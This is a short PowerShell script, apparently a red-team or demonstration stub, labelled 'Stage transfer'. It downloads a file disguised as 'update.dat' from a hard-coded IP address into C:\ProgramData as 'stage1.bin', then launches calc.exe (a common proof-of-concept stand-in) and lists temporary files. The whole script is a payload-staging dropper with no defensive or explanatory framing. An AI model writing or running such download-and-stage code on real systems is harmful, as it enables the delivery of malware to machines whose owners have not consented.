<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://198.51.100.106/update.dat",
    [string]$OutputPath = "C:\ProgramData\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $OutputPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
